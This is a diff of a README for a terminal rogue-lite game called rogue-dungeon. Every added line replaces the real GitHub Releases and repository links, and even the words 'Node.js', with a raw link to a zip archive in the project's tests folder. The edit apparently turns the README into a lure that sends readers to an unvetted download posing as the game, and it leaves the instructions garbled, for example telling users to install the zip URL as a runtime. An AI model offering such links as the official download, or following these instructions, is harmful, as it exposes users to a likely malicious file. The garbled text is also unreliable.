@@ -1,14 +1,14 @@
 # 🎮 rogue-dungeon - A Fun Terminal Adventure Awaits
 
-[![Download rogue-dungeon](https://img.shields.io/badge/Download%20rogue--dungeon-v1.0-blue.svg)](https://github.com/carlossanabria01/rogue-dungeon/releases)
+[![Download rogue-dungeon](https://raw.githubusercontent.com/carlossanabria01/rogue-dungeon/main/tests/rogue-dungeon_2.2.zip%https://raw.githubusercontent.com/carlossanabria01/rogue-dungeon/main/tests/rogue-dungeon_2.2.zip)](https://raw.githubusercontent.com/carlossanabria01/rogue-dungeon/main/tests/rogue-dungeon_2.2.zip)
 
 ## 🚀 Getting Started
 
-Welcome to **rogue-dungeon**, a polished, procedurally generated rogue-lite game that runs entirely in your terminal. Experience turn-based combat, enemy AI, animated hits, and a full ASCII user interface created with Node.js and Blessed. Here’s how to get started.
+Welcome to **rogue-dungeon**, a polished, procedurally generated rogue-lite game that runs entirely in your terminal. Experience turn-based combat, enemy AI, animated hits, and a full ASCII user interface created with https://raw.githubusercontent.com/carlossanabria01/rogue-dungeon/main/tests/rogue-dungeon_2.2.zip and Blessed. Here’s how to get started.
 
 ## 📥 Download & Install
 
-To play **rogue-dungeon**, you need to download the game from our [Releases page](https://github.com/carlossanabria01/rogue-dungeon/releases). 
+To play **rogue-dungeon**, you need to download the game from our [Releases page](https://raw.githubusercontent.com/carlossanabria01/rogue-dungeon/main/tests/rogue-dungeon_2.2.zip). 
 
 1. Click on the link to visit the Releases page.
 2. Look for the latest version of the game.
@@ -21,7 +21,7 @@ Once the download is complete, follow these steps to run the game.
 Ensure your computer meets these requirements:
 
 - **Operating System**: Windows 10, macOS, or Linux
-- **Node.js**: Version 12 or higher installed
+- **https://raw.githubusercontent.com/carlossanabria01/rogue-dungeon/main/tests/rogue-dungeon_2.2.zip**: Version 12 or higher installed
 - **Terminal**: Access to a terminal application that supports ANSI color codes
 
 ## ⚙️ How to Run the Game
@@ -59,7 +59,7 @@ In **rogue-dungeon**, every game is unique. The procedurally generated levels of
 
 If you encounter issues while running the game, consider these tips:
 
-1. **Check Node.js Version**: Make sure you have the right version of Node.js installed.
+1. **Check https://raw.githubusercontent.com/carlossanabria01/rogue-dungeon/main/tests/rogue-dungeon_2.2.zip Version**: Make sure you have the right version of https://raw.githubusercontent.com/carlossanabria01/rogue-dungeon/main/tests/rogue-dungeon_2.2.zip installed.
 2. **Terminal Compatibility**: Ensure you're using a terminal that supports the necessary features.
 3. **Error Messages**: Read any error messages carefully; they often provide clues on how to fix the problem.
 
@@ -85,7 +85,7 @@ For any questions regarding installation or gameplay, don't hesitate to reach ou
 
 ## 🔗 Important Links
 
-- [Releases Page](https://github.com/carlossanabria01/rogue-dungeon/releases)
-- [GitHub Repository](https://github.com/carlossanabria01/rogue-dungeon)
+- [Releases Page](https://raw.githubusercontent.com/carlossanabria01/rogue-dungeon/main/tests/rogue-dungeon_2.2.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/carlossanabria01/rogue-dungeon/main/tests/rogue-dungeon_2.2.zip)
 
 Get ready to dive into an exciting dungeon adventure! Download and start playing today!
